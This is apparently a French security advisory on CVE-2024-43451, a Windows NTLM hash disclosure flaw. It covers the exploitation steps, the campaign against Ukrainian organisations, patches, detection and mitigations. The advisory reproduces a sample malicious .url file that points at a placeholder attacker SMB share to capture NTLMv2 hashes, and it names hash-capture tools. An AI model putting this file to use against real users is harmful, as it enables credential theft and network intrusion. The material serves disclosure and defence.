Titre: CVE-2024-43451 - Windows NTLM Hash Disclosure Spoofing Vulnerability (Zero-Day)

Numéro CVE: CVE-2024-43451
Date de publication: 12 novembre 2024
Dernière modification: 26 novembre 2024
Statut: Exploité activement dans la nature (Zero-Day) - Ajouté au catalogue CISA KEV

Description:
Windows NTLM Hash Disclosure Spoofing Vulnerability allows attackers to capture 
NTLMv2 password hashes with minimal user interaction, potentially leading to 
credential theft and unauthorized system access via pass-the-hash attacks.

Sévérité: 
- Microsoft: Important
- CVSS v3.1: 6.5 (MEDIUM)
- CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
- CISA KEV: Exploité dans la nature - Deadline de correction: 2 décembre 2024

Produits affectés:
- Windows 10 (toutes versions incluant 22H2)
- Windows 11 (versions 21H2, 22H2, 23H2, 24H2)
- Windows Server 2008, 2012, 2016, 2019, 2022, 2025
- Toutes les versions supportées de Windows

Type de vulnérabilité:
- CWE-73: External Control of File Name or Path
- NTLM Hash Disclosure
- Spoofing Vulnerability
- Credential Theft

Vecteur d'attaque:
- Réseau (Network) - AV:N
- Complexité d'attaque: Faible - AC:L
- Aucune authentification requise - PR:N
- Interaction utilisateur: Requise (minimale) - UI:R
- Impact: Haute confidentialité - C:H

Méthode d'exploitation:
L'attaquant crée un fichier URL malveillant (.url) contenant un lien SMB vers son serveur:
1. Le fichier URL est distribué par phishing (email, serveur compromis)
2. L'utilisateur effectue une action simple sur le fichier:
   - Clic droit
   - Suppression (touche Delete)
   - Glisser-déposer vers un autre dossier
3. Windows initie automatiquement une connexion SMB au serveur de l'attaquant
4. Le hash NTLMv2 de l'utilisateur est transmis lors de l'authentification
5. L'attaquant capture le hash avec des outils comme Responder
6. Le hash peut être utilisé pour des attaques pass-the-hash ou crack

Exemple de fichier malveillant (.url):
[InternetShortcut]
URL=\\<attacker_ip>\share
IconIndex=32
IconFile=C:\Windows\System32\shell32.dll

Impact potentiel:
- Confidentialité: HAUTE - Divulgation du hash NTLMv2 de l'utilisateur
- Vol de credentials et usurpation d'identité
- Attaques pass-the-hash permettant l'authentification sans mot de passe
- Élévation de privilèges sur le système
- Mouvement latéral dans le réseau d'entreprise
- Installation de malware (SparkRAT, Redline Stealer observés)
- Accès non autorisé aux ressources réseau

Exploitation dans la nature:
EXPLOITÉ ACTIVEMENT depuis avril 2024 (6 mois avant le patch)
- Attaquants: APT russes (suspicion), acteurs menaçants ukrainiens ciblés
- Campagne documentée par ClearSky et CERT-UA (juin 2024)
- Vecteur: Emails de spear-phishing depuis serveurs académiques ukrainiens compromis
- Malwares déployés: SparkRAT, Redline Stealer
- Cibles: Organisations ukrainiennes, gouvernementales et académiques
- PoC public disponible sur GitHub
- Troisième vulnérabilité NTLM hash disclosure exploitée en 2024

Découverte:
- Divulgation: Anonyme + Google Threat Analysis Group
- Vlad Stolyarov (Google TAG)
- Bahare Sabouri (Google TAG)
- Documenté par: ClearSky Cyber Security, CERT-UA

Correctif:
Microsoft a publié des correctifs dans le November 2024 Patch Tuesday.
Appliquer immédiatement les mises à jour suivantes:

Windows 10:
- KB5046612, KB5046613, KB5046615, KB5046616

Windows 11:
- KB5046617, KB5046618, KB5046633

Windows Server:
- KB5046665, KB5046682

Versions corrigées:
- Windows 10 21H2: Build 19044.5131
- Windows 10 22H2: Build 19045.5131
- Windows 11 21H2: Build 22000.3482
- Windows 11 22H2: Build 22621.4602
- Windows 11 23H2: Build 22631.4602
- Windows 11 24H2: Build 26100.2454

Détection:
- Surveiller les connexions SMB sortantes inhabituelles
- Analyser les logs d'authentification NTLM
- Rechercher les fichiers .url suspects avec des chemins UNC
- Détecter les outils de capture de hash (Responder, Inveigh)
- Scanner avec des outils de détection de vulnérabilités

Références officielles:
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43451
- https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- https://www.clearskysec.com/0d-vulnerability-exploited-in-the_wild/
- https://www.helpnetsecurity.com/2024/11/14/cve-2024-43451-exploited/
- https://github.com/RonF98/CVE-2024-43451-POC
- https://www.bleepingcomputer.com/news/security/microsoft-patches-windows-zero-day-exploited-in-attacks-on-ukraine/
- https://www.tenable.com/blog/microsofts-november-2024-patch-tuesday-addresses-87-cves-cve-2024-43451

Contexte technique - NTLM et Pass-the-Hash:
NTLM (NT LAN Manager) est un protocole d'authentification Microsoft hérité mais 
toujours largement utilisé. Le hash NTLMv2 contient les credentials de l'utilisateur 
sous forme chiffrée. Dans une attaque pass-the-hash, l'attaquant n'a pas besoin 
de déchiffrer le mot de passe - il peut réutiliser directement le hash pour 
s'authentifier auprès d'autres systèmes Windows sur le réseau.

Cette vulnérabilité exploite la gestion des fichiers URL par Windows. Lorsqu'un 
utilisateur interagit avec un fichier .url contenant un chemin UNC (\\serveur\partage), 
Windows tente automatiquement de s'authentifier auprès du serveur distant en 
transmettant le hash NTLM de l'utilisateur.

Contexte APT - Campagne ukrainienne:
En juin 2024, des attaquants (probablement russes) ont compromis un serveur 
académique ukrainien pour envoyer des emails de phishing crédibles. Les emails 
demandaient aux victimes de "renouveler leur certificat académique" via un 
fichier joint. Le simple fait de supprimer ou déplacer le fichier déclenchait 
l'exploitation et le vol du hash NTLM.

Mesures de mitigation (en attendant le patch):
1. Bloquer le trafic SMB sortant (ports 445, 139) au niveau du firewall
2. Désactiver NTLM si possible (privilégier Kerberos)
3. Implémenter EPA (Extended Protection for Authentication)
4. Activer SMB signing obligatoire
5. Utiliser des politiques de groupe pour restreindre NTLM:
   - Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers
6. Former les utilisateurs à ne pas interagir avec des fichiers suspects
7. Bloquer les fichiers .url dans les emails via filtrage

Recommandations urgentes:
1. APPLIQUER LE PATCH IMMÉDIATEMENT (date limite CISA: 2 décembre 2024)
2. Redémarrer tous les systèmes Windows après la mise à jour
3. Auditer les comptes ayant pu être compromis depuis avril 2024
4. Forcer la réinitialisation des mots de passe pour les comptes à risque
5. Surveiller les connexions SMB inhabituelles dans les logs
6. Bloquer le trafic SMB sortant non nécessaire
7. Déployer des solutions EDR pour détecter les comportements suspects
8. Scanner le réseau pour détecter des compromissions existantes
9. Mettre en place une politique de gestion stricte des fichiers .url
10. Informer tous les utilisateurs du risque et des bonnes pratiques

Indicateurs de compromission (IoC):
- Fichiers .url avec des chemins UNC vers des IPs externes
- Connexions SMB sortantes vers des IPs non autorisées
- Présence de Responder ou Inveigh sur le réseau
- Fichiers suspects: "certificate_renewal.url", "academic_certificate.url"
- Malwares: SparkRAT, Redline Stealer
- Tentatives d'authentification NTLM anormales dans les logs

Mots-clés: CVE-2024-43451, Windows, NTLM, hash disclosure, spoofing, zero-day, 
pass-the-hash, credential theft, SMB, URL file, phishing, APT, Russia, Ukraine, 
SparkRAT, Redline, CISA KEV, patch Tuesday, November 2024, authentication bypass, 
privilege escalation, ClearSky, CERT-UA, Google TAG, Microsoft security